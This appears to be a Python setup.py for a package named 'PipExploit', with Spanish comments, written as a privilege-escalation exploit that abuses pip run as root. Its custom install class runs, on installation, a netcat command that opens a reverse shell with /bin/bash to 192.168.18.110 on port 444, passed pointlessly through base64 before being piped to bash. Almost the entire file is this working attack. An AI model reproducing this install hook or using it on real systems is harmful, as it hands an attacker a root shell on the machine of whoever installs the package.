from setuptools import setup # Esta es nuestra funcion de inicializacion
from setuptools.command.install import install # Y este se encargara de instalar el paquete apenas se instale
import os ## y esta es para escalar priviligios

"""
Declaramos una clase que contenga el PRIVES con /usr/bin/pip
Esta recibe un parametro el cual es la funcion de install importada
"""

class ExploitInstall(install):
    def run(self):
        install.run(self)
        os.system("echo 'nc -e /bin/bash 192.168.18.110 444'| base64 | base64 -d | bash")

def pwnRoot():
    """
    Aqui es donde empieza la magia de la elaboracion de paquetes
    """
    setup(name='PipExploit',
            version='1.0',
            description='This is pwned Root Privescalation in /usr/bin/pip',
            author='dkb4rb',
            author_email='jjuannca651@gmail.com',
            url='https://github.com/dkb4rb/PipExploit',
            licence='MIT',
            cmdclass={"install":ExploitInstall})

if __name__ == "__main__":
    print("\n Como buen dev hay que llevar el flujo del programa")
    pwnRoot()
